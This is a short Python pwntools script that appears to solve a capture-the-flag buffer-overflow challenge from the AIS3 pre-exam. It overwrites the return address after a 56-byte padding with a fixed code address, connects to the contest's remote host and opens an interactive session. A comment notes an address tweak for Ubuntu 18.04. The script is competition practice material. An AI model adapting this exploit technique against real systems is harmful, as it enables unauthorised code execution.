from pwn import *

offset = 56
ais3= p64(0x0000000000400688)
#原本是 400687 但 18.04 不能 work 所以換成下一行

#r = process('./bof')
r = remote('pre-exam-pwn.ais3.org', 10000)
#raw_input()
payload = 'a'*56 + ais3
r.recvuntil('\n')
r.send(payload)
r.interactive()

